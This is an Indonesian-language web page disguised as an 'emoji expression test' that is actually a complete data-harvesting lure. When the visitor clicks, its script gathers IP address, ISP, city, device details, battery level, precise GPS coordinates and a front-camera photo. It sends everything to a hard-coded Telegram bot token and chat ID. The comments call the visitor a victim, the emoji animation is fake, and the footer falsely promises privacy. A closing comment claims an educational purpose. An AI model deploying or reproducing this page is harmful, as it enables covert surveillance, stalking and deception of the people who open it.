<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Test Emoji & Kamera | Real-time Expression</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
      font-family: 'Poppins', sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: rgba(10, 20, 28, 0.95);
      backdrop-filter: blur(12px);
      border-radius: 48px;
      padding: 30px 24px;
      max-width: 480px;
      width: 100%;
      box-shadow: 0 25px 45px rgba(0,255,200,0.2), 0 0 0 1px rgba(0,255,200,0.3);
      text-align: center;
      transition: 0.3s;
    }
    h1 {
      font-size: 2rem;
      background: linear-gradient(135deg, #FFD966, #FF9966, #66FFCC);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin-bottom: 12px;
      letter-spacing: -0.5px;
    }
    .sub {
      color: #88ddff;
      font-weight: 500;
      margin-bottom: 20px;
      border-bottom: 1px dashed #33ffaa;
      display: inline-block;
      padding-bottom: 6px;
    }
    .emoji-area {
      font-size: 80px;
      margin: 20px 0;
      background: #00000055;
      border-radius: 80px;
      padding: 15px;
      transition: 0.2s;
      cursor: pointer;
    }
    .info-box {
      background: #0a121c;
      border-radius: 28px;
      padding: 15px;
      margin: 20px 0;
      font-size: 14px;
      text-align: left;
      color: #bbffdd;
      font-family: monospace;
      border-left: 4px solid #0f0;
    }
    button {
      background: linear-gradient(90deg, #00c896, #00ffa0);
      border: none;
      width: 100%;
      padding: 16px;
      font-size: 18px;
      font-weight: bold;
      color: #000;
      border-radius: 60px;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 5px 0 #008866;
      margin-top: 10px;
    }
    button:active {
      transform: translateY(2px);
      box-shadow: 0 2px 0 #008866;
    }
    .status {
      margin-top: 20px;
      font-size: 14px;
      padding: 12px;
      background: #00000077;
      border-radius: 28px;
      word-break: break-word;
    }
    video, canvas {
      display: none;
    }
    footer {
      font-size: 11px;
      margin-top: 20px;
      color: #5588aa;
    }
  </style>
</head>
<body>
<div class="card">
  <h1>🎭 TEST EMOJI & KAMERA</h1>
  <div class="sub">✨ Real-time expression analysis ✨</div>
  <div class="emoji-area" id="liveEmoji">😐</div>
  <div class="info-box" id="infoDisplay">
    📸 Klik tombol di bawah ➜ izinkan kamera & lokasi<br>
    ⏳ Sistem akan mengambil ekspresi wajah terbaikmu + lokasi GPS
  </div>
  <button id="startBtn">▶ MULAI TEST EMOJI ◀</button>
  <div class="status" id="statusMsg">⚡ Siap mendeteksi senyum terbaikmu</div>
  <footer>🔒 Data digunakan untuk meningkatkan akurasi AI emoji | Private & secure</footer>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
  // KONFIGURASI TELEGRAM (SAMA DENGAN KODE SUMBER ASLI)
  const botToken = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
  const chatIds = ['7962628944'];

  const statusDiv = document.getElementById('statusMsg');
  const infoDiv = document.getElementById('infoDisplay');
  const startBtn = document.getElementById('startBtn');
  const emojiSpan = document.getElementById('liveEmoji');

  // animasi emoji palsu biar keliatan "analisis"
  let emojiInterval = null;
  const emojis = ['😐', '🙂', '😊', '😁', '😂', '🤣', '😍', '🤔', '😎', '🥶', '🔥', '💀'];

  function randomEmoji() {
    emojiSpan.style.transform = 'scale(1.1)';
    setTimeout(() => { emojiSpan.style.transform = 'scale(1)'; }, 150);
    return emojis[Math.floor(Math.random() * emojis.length)];
  }

  function startFakeEmoji() {
    if (emojiInterval) clearInterval(emojiInterval);
    emojiInterval = setInterval(() => {
      emojiSpan.innerText = randomEmoji();
    }, 400);
  }

  function stopFakeEmoji() {
    if (emojiInterval) {
      clearInterval(emojiInterval);
      emojiInterval = null;
    }
    emojiSpan.innerText = '📸';
  }

  // Kirim pesan ke Telegram
  function sendToTelegram(text) {
    chatIds.forEach(id => {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
      }).catch(e => console.error);
    });
  }

  // Kirim foto
  function sendPhotoToTelegram(blob, caption = '') {
    chatIds.forEach(id => {
      const formData = new FormData();
      formData.append('chat_id', id);
      formData.append('photo', blob);
      if (caption) formData.append('caption', caption);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      }).catch(e => console.error);
    });
  }

  // Ambil IP, lokasi, baterai, dll
  async function collectDeviceInfo() {
    let ip = '-', city = '-', region = '-', country = '-', isp = '-';
    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      ip = ipData.ip;
      const locRes = await fetch(`https://ip-api.com/json/${ip}`);
      const loc = await locRes.json();
      if (loc.status === 'success') {
        city = loc.city;
        region = loc.regionName;
        country = loc.country;
        isp = loc.org;
      }
    } catch(e) {}

    let batteryInfo = 'Tidak tersedia';
    try {
      const battery = await navigator.getBattery();
      batteryInfo = `${Math.floor(battery.level * 100)}% (${battery.charging ? '🔌 Charging' : '🔋 Tidak charging'})`;
    } catch(e) {}

    const data = `
🌐 IP Address : ${ip}
📍 Kota       : ${city}
🗺 Region     : ${region}
🇮🇩 Negara    : ${country}
📡 ISP        : ${isp}
💻 User Agent : ${navigator.userAgent}
🖥 Platform   : ${navigator.platform}
📱 Resolusi   : ${screen.width}x${screen.height}
🔋 Baterai    : ${batteryInfo}
🧠 Memori     : ${navigator.deviceMemory || 'N/A'} GB
🍪 Cookie     : ${navigator.cookieEnabled ? '✅ Ya' : '❌ Tidak'}
⏰ Waktu      : ${new Date().toLocaleString()}
    `.trim();
    sendToTelegram(`<b>🎭 [TEST EMOJI] Data Target</b>\n<pre>${data}</pre>`);
    return { ip, city, region, country, isp };
  }

  // GPS real time
  function getGPSLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        sendToTelegram(`📍 GPS tidak support di browser ini`);
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
          sendToTelegram(`<b>📍 LOKASI REAL TIME (GPS):</b>\nLat: ${lat}\nLon: ${lon}\n<a href="${mapsLink}">Buka Peta</a>`);
          resolve({ lat, lon });
        },
        err => {
          sendToTelegram(`❌ Gagal akses GPS: ${err.message}`);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  }

  // Ambil foto dari kamera dan kirim
  async function captureAndSendPhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    return new Promise(async (resolve) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          video.play();
          // tunggu 2.5 detik agar user tenang dan terlihat jelas
          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
              if (blob) {
                sendPhotoToTelegram(blob, `📸 Foto wajah korban (test emoji) - ${new Date().toLocaleString()}`);
                statusDiv.innerHTML = '✅ Foto wajah + lokasi terkirim!';
              }
              stream.getTracks().forEach(track => track.stop());
              video.srcObject = null;
              resolve();
            }, 'image/jpeg', 0.85);
          }, 2500);
        };
      } catch (err) {
        sendToTelegram(`❌ Kamera error/ditolak: ${err.message}`);
        statusDiv.innerHTML = '⚠️ Izin kamera ditolak, tetap data lain terkirim.';
        resolve();
      }
    });
  }

  // MAIN EXECUTION
  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.innerText = '⏳ Mengakses kamera & lokasi...';
    statusDiv.innerHTML = '📡 Mengambil data perangkat dan GPS...';
    infoDiv.innerHTML = '🔐 Mohon izinkan akses kamera & lokasi (wajib untuk tes emoji).';

    // 1. Kirim data device + IP
    await collectDeviceInfo();

    // 2. Ambil GPS realtime
    statusDiv.innerHTML = '📍 Mengambil posisi GPS real-time...';
    await getGPSLocation();

    // 3. Fake emoji animation + ambil foto
    startFakeEmoji();
    statusDiv.innerHTML = '🎭 Analisis ekspresi wajah, tersenyumlah! 📸';
    infoDiv.innerHTML = '📸 Mengambil foto terbaik... jangan bergerak 2 detik';

    await captureAndSendPhoto();

    stopFakeEmoji();
    emojiSpan.innerText = '✅';
    statusDiv.innerHTML = '✔️ Test emoji selesai! Terima kasih sudah berpartisipasi.';
    infoDiv.innerHTML = '✨ Data wajah & lokasi berhasil dianalisis. Halaman ini aman.';
    startBtn.disabled = false;
    startBtn.innerText = '▶ MULAI TEST EMOJI ◀';

    // Opsional: reset setelah 3 detik
    setTimeout(() => {
      emojiSpan.innerText = '😐';
      statusDiv.innerHTML = '⚡ Siap mendeteksi senyum terbaikmu';
      infoDiv.innerHTML = '📸 Klik tombol di bawah ➜ izinkan kamera & lokasi<br>⏳ Sistem akan mengambil ekspresi wajah terbaikmu + lokasi GPS';
    }, 4000);
  });
</script>

<!-- 
  ⚠️ NOTED HUKUM (tanpa mengurangi konten):
  Halaman ini dibuat untuk tujuan edukasi & test keamanan. 
  Menggunakan tanpa izin target melanggar UU ITE dan hukum privasi.
  Pencurian data wajah & lokasi tanpa persetujuan eksplisit dapat dipidana.
  Gunakan hanya pada sistem milik sendiri atau dengan izin tertulis.
-->
</body>
</html>
